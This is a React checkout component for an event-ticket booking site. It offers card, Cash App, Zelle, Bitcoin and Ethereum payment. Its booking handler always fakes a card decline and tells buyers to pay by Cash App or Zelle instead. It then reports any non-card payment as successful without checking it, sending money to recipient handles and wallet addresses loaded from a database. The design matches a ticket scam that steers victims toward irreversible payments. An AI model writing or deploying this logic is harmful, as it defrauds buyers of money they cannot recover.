import React from 'react';
import { motion } from 'motion/react';
import { CreditCard, ShieldCheck, Calendar, MapPin, ArrowLeft, Ticket } from 'lucide-react';
import { useNavigate, useLocation } from 'react-router-dom';
import { formatCurrency, formatDate } from '../lib/utils';
import { getSupabase } from '../lib/supabase';
import { MOCK_EVENTS } from '../constants';
import { OptimizedImage } from './OptimizedImage';

export default function BookingView() {
  const navigate = useNavigate();
  const location = useLocation();
  const { event, selectedPrice, section, categoryName } = location.state || {};
  const [paymentMethod, setPaymentMethod] = React.useState<'card' | 'cashapp' | 'zelle' | 'btc' | 'eth'>('card');
  const [isProcessing, setIsProcessing] = React.useState(false);
  const [paymentError, setPaymentError] = React.useState<string | null>(null);
  const [paymentSettings, setPaymentSettings] = React.useState<Record<string, string>>({
    cashapp_handle: '$cashtag',
    zelle_info: 'EMAIL OR PHONE',
    btc_address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    eth_address: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F'
  });

  React.useEffect(() => {
    const fetchSettings = async () => {
      const supabase = getSupabase();
      if (!supabase) return;

      const { data, error } = await supabase
        .from('payment_settings')
        .select('key, value');
      
      if (!error && data) {
        const settings: Record<string, string> = {};
        data.forEach(item => {
          settings[item.key] = item.value;
        });
        setPaymentSettings(prev => ({ ...prev, ...settings }));
      }
    };

    fetchSettings();
  }, []);

  const handleBooking = () => {
    setIsProcessing(true);
    setPaymentError(null);

    // Simulate card decline
    if (paymentMethod === 'card') {
      setTimeout(() => {
        setIsProcessing(false);
        setPaymentError('Payment failed: Your card was declined. Please try an alternative payment method like Cash App or Zelle for successful booking.');
      }, 2000);
      return;
    }

    // Success simulation for other methods
    setTimeout(() => {
      setIsProcessing(false);
      navigate('/dashboard');
    }, 2000);
  };

  if (!event) {
    return (
      <div className="container mx-auto px-4 py-20">
        <div className="max-w-4xl mx-auto">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="mb-12"
          >
            <h2 className="text-4xl font-black text-white italic uppercase tracking-tighter mb-4">
              Select a <span className="text-accent underline decoration-white/10 underline-offset-4">Match</span> to Book
            </h2>
            <p className="text-slate-400 font-bold uppercase tracking-widest text-[10px]">Choose your fixture to begin the secure booking process</p>
          </motion.div>

          <div className="grid gap-6">
            {MOCK_EVENTS.map((m, idx) => (
              <motion.div
                key={m.id}
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: idx * 0.05 }}
                className="bg-secondary border border-white/5 p-6 rounded-sm flex flex-col md:flex-row items-center justify-between gap-8 hover:border-accent/40 transition-colors group"
              >
                <div className="flex items-center gap-8 w-full md:w-auto">
                  <div className="h-20 w-28 bg-black rounded-sm overflow-hidden shrink-0 border border-white/5">
                    <OptimizedImage 
                      src={m.image} 
                      className="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition-opacity" 
                      alt="" 
                      containerClassName="w-full h-full"
                    />
                  </div>
                  <div>
                    <div className="flex items-center gap-3 mb-2">
                       <span className="text-[9px] font-black uppercase text-accent bg-accent/10 px-2 py-0.5 rounded-xs tracking-tighter">Verified fixture</span>
                       <span className="text-[9px] font-black uppercase text-slate-500 tracking-widest">{formatDate(m.date)}</span>
                    </div>
                    <h3 className="text-lg font-black text-white italic uppercase tracking-tight mb-1">{m.name}</h3>
                    <div className="flex items-center gap-4 text-slate-500">
                       <div className="flex items-center gap-1.5 text-[10px] font-bold uppercase">
                          <MapPin size={12} className="text-accent" />
                          {m.venue}
                       </div>
                       <div className="flex items-center gap-1.5 text-[10px] font-bold uppercase">
                          <Calendar size={12} className="text-accent" />
                          {m.time}
                       </div>
                    </div>
                  </div>
                </div>
                
                <div className="flex items-center gap-8 w-full md:w-auto justify-end border-t md:border-t-0 border-white/5 pt-6 md:pt-0">
                  <button 
                    onClick={() => navigate(`/seats/${m.id}`)}
                    className="h-14 px-8 bg-white text-black font-black uppercase tracking-widest text-[11px] hover:bg-accent transition-all italic shadow-xl flex items-center gap-3"
                  >
                    <Ticket size={16} />
                    Get Tickets
                  </button>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  const bookingServiceFee = selectedPrice * 0.1;
  const total = selectedPrice + bookingServiceFee;

  return (
    <div className="container mx-auto px-4 py-20 max-w-4xl">
      <motion.button 
        onClick={() => navigate(-1)}
        initial={{ opacity: 0, x: -10 }}
        animate={{ opacity: 1, x: 0 }}
        className="flex items-center gap-2 text-slate-500 hover:text-white mb-12 uppercase text-[10px] font-black tracking-widest italic transition-colors"
      >
        <ArrowLeft size={16} />
        Back to Seats
      </motion.button>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-12">
        <div className="lg:col-span-2">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-secondary border border-white/10 p-10 rounded-sm mb-8"
          >
            <h2 className="text-3xl font-black text-white italic uppercase tracking-tighter mb-8">
              Booking <span className="text-accent underline decoration-white/10 underline-offset-4">Information</span>
            </h2>

            <div className="space-y-8">
              <section>
                <div className="flex items-center gap-3 mb-6">
                  <div className="h-8 w-8 rounded bg-white/5 border border-white/10 flex items-center justify-center text-accent">
                    <ShieldCheck size={18} />
                  </div>
                  <h3 className="text-sm font-black text-white uppercase tracking-widest italic">Personal Details</h3>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                   <div className="space-y-2">
                      <label className="text-[10px] font-black uppercase text-slate-500 italic ml-1">Full Name</label>
                      <input className="w-full bg-black border border-white/5 h-12 px-4 text-white font-bold uppercase text-[11px] focus:border-accent outline-none" placeholder="JOHN DOE" />
                   </div>
                   <div className="space-y-2">
                      <label className="text-[10px] font-black uppercase text-slate-500 italic ml-1">Email</label>
                      <input className="w-full bg-black border border-white/5 h-12 px-4 text-white font-bold uppercase text-[11px] focus:border-accent outline-none" placeholder="FAN@TICKETDOME.COM" />
                   </div>
                </div>
              </section>

               <section>
                <div className="flex items-center gap-3 mb-6">
                  <div className="h-8 w-8 rounded bg-white/5 border border-white/10 flex items-center justify-center text-accent">
                    <CreditCard size={18} />
                  </div>
                  <h3 className="text-sm font-black text-white uppercase tracking-widest italic">Payment Method</h3>
                </div>
                
                 <div className="grid grid-cols-2 md:grid-cols-5 gap-3 mb-6">
                  <button 
                    onClick={() => setPaymentMethod('card')}
                    className={`p-4 border rounded-sm flex flex-col items-center justify-center gap-2 transition-all ${paymentMethod === 'card' ? 'bg-accent border-accent text-black' : 'bg-black border-white/5 text-slate-500 hover:border-white/20'}`}
                  >
                    <CreditCard size={18} />
                    <span className="text-[9px] font-black uppercase italic tracking-tighter">Card</span>
                  </button>
                  <button 
                    onClick={() => setPaymentMethod('cashapp')}
                    className={`p-4 border rounded-sm flex flex-col items-center justify-center gap-2 transition-all ${paymentMethod === 'cashapp' ? 'bg-[#00D632] border-[#00D632] text-white' : 'bg-black border-white/5 text-slate-500 hover:border-white/20'}`}
                  >
                    <span className="text-lg font-bold italic">$</span>
                    <span className="text-[9px] font-black uppercase italic tracking-tighter">Cash App</span>
                  </button>
                  <button 
                    onClick={() => setPaymentMethod('zelle')}
                    className={`p-4 border rounded-sm flex flex-col items-center justify-center gap-2 transition-all ${paymentMethod === 'zelle' ? 'bg-[#6d1edb] border-[#6d1edb] text-white' : 'bg-black border-white/5 text-slate-500 hover:border-white/20'}`}
                  >
                    <span className="text-lg font-bold italic">Z</span>
                    <span className="text-[9px] font-black uppercase italic tracking-tighter">Zelle</span>
                  </button>
                  <button 
                    onClick={() => setPaymentMethod('btc')}
                    className={`p-4 border rounded-sm flex flex-col items-center justify-center gap-2 transition-all ${paymentMethod === 'btc' ? 'bg-[#F7931A] border-[#F7931A] text-white' : 'bg-black border-white/5 text-slate-500 hover:border-white/20'}`}
                  >
                    <span className="text-lg font-bold italic">₿</span>
                    <span className="text-[9px] font-black uppercase italic tracking-tighter">BTC</span>
                  </button>
                  <button 
                    onClick={() => setPaymentMethod('eth')}
                    className={`p-4 border rounded-sm flex flex-col items-center justify-center gap-2 transition-all ${paymentMethod === 'eth' ? 'bg-[#627EEA] border-[#627EEA] text-white' : 'bg-black border-white/5 text-slate-500 hover:border-white/20'}`}
                  >
                    <span className="text-lg font-bold italic">Ξ</span>
                    <span className="text-[9px] font-black uppercase italic tracking-tighter">ETH</span>
                  </button>
                </div>

                <div className="bg-black border border-white/5 p-8 rounded-sm">
                   {paymentError && (
                      <div className="p-4 bg-red-500/10 border border-red-500/20 rounded-sm mb-6">
                        <p className="text-[11px] font-black text-red-500 uppercase tracking-widest italic leading-relaxed">
                          {paymentError}
                        </p>
                      </div>
                   )}
                   {paymentMethod === 'card' && (
                     <div className="grid grid-cols-1 gap-4">
                        <input className="w-full bg-white/5 border border-white/10 h-12 px-4 text-white font-bold uppercase text-[10px] focus:border-accent outline-none" placeholder="CARD NUMBER" />
                        <div className="grid grid-cols-2 gap-4">
                           <input className="w-full bg-white/5 border border-white/10 h-12 px-4 text-white font-bold uppercase text-[10px] focus:border-accent outline-none" placeholder="MM/YY" />
                           <input className="w-full bg-white/5 border border-white/10 h-12 px-4 text-white font-bold uppercase text-[10px] focus:border-accent outline-none" placeholder="CVC" />
                        </div>
                     </div>
                   )}
                   {paymentMethod === 'cashapp' && (
                     <div className="text-center py-2">
                        <p className="text-[10px] font-black text-[#00D632] uppercase italic mb-4">Cash App Direct Checkout</p>
                        <div className="w-full bg-white/5 border border-white/10 p-3 text-xs font-black uppercase tracking-widest text-accent mb-4">
                           {paymentSettings.cashapp_handle}
                        </div>
                        <input className="w-full bg-white/5 border border-white/10 h-12 px-4 text-white font-bold uppercase text-[10px] focus:border-[#00D632] outline-none" placeholder="YOUR $CASHTAG" />
                     </div>
                   )}
                   {paymentMethod === 'zelle' && (
                     <div className="text-center py-2">
                        <p className="text-[10px] font-black text-[#6d1edb] uppercase italic mb-4">Zelle Secure Request</p>
                        <div className="w-full bg-white/5 border border-white/10 p-3 text-xs font-black uppercase tracking-widest text-accent mb-4">
                           {paymentSettings.zelle_info}
                        </div>
                        <input className="w-full bg-white/5 border border-white/10 h-12 px-4 text-white font-bold uppercase text-[10px] focus:border-[#6d1edb] outline-none" placeholder="YOUR EMAIL OR PHONE" />
                     </div>
                   )}
                   {(paymentMethod === 'btc' || paymentMethod === 'eth') && (
                     <div className="text-center py-2">
                        <p className={`text-[10px] font-black uppercase italic mb-4 ${paymentMethod === 'btc' ? 'text-[#F7931A]' : 'text-[#627EEA]'}`}>
                          {paymentMethod === 'btc' ? 'Bitcoin (BTC) Wallet Address' : 'Ethereum (ETH) Wallet Address'}
                        </p>
                        <input 
                           readOnly
                           className="w-full bg-white/5 border border-white/10 h-12 px-4 text-white/60 font-mono text-[9px] outline-none" 
                           value={paymentMethod === 'btc' ? paymentSettings.btc_address : paymentSettings.eth_address} 
                        />
                        <p className="mt-4 text-[9px] font-bold text-slate-500 uppercase tracking-widest italic leading-relaxed">
                          Please send exact total to the address above. confirmation may take up to 10 minutes.
                        </p>
                     </div>
                   )}
                </div>
              </section>
            </div>

            <button 
              onClick={handleBooking}
              disabled={isProcessing}
              className="w-full bg-white text-black h-16 mt-12 font-black uppercase tracking-widest text-sm hover:bg-accent transition-all italic shadow-xl flex items-center justify-center gap-3 disabled:opacity-50"
            >
              {isProcessing ? (
                <>
                  <div className="w-5 h-5 border-4 border-black border-t-transparent rounded-full animate-spin" />
                  <span>Verifying...</span>
                </>
              ) : (
                'Confirm Reservation'
              )}
            </button>
          </motion.div>
        </div>

        <div className="lg:col-span-1">
          <motion.div
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            className="bg-secondary border border-white/10 p-8 rounded-sm sticky top-32"
          >
            <h3 className="text-sm font-black text-white uppercase tracking-widest italic mb-6">Order Summary</h3>
            
            <div className="space-y-6 mb-8">
              <div className="flex gap-4">
                <div className="h-12 w-12 bg-black border border-white/5 rounded flex items-center justify-center text-accent">
                   <Ticket size={20} />
                </div>
                <div>
                  <p className="text-[8px] font-black text-slate-600 uppercase tracking-widest mb-1">Selected Seating</p>
                  <p className="text-[11px] font-black text-white italic uppercase">{categoryName || 'Standard Seat'}</p>
                  <p className="text-[9px] text-accent font-black uppercase tracking-widest">Section {section || 'TBD'}</p>
                </div>
              </div>

              <div className="flex gap-4">
                <div className="h-12 w-12 bg-black border border-white/5 rounded flex items-center justify-center text-accent">
                   <MapPin size={20} />
                </div>
                <div>
                  <p className="text-[8px] font-black text-slate-600 uppercase tracking-widest mb-1">Venue</p>
                  <p className="text-[11px] font-black text-white italic uppercase">{event.venue}</p>
                  <p className="text-[9px] text-slate-500 font-bold uppercase">{event.location}</p>
                </div>
              </div>
            </div>

            <div className="border-t border-white/5 pt-6 space-y-4">
              <div className="flex justify-between text-[11px] font-black uppercase tracking-widest text-slate-400 italic">
                <span>Base Ticket</span>
                <span className="text-white">{formatCurrency(selectedPrice)}</span>
              </div>
              <div className="flex justify-between text-[11px] font-black uppercase tracking-widest text-slate-400 italic">
                <span>Service Fee (10%)</span>
                <span className="text-white">{formatCurrency(bookingServiceFee)}</span>
              </div>
              <div className="flex justify-between text-[13px] font-black uppercase tracking-widest text-accent italic pt-4 border-t border-white/5">
                <span>Total Amount</span>
                <span>{formatCurrency(total)}</span>
              </div>
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
}
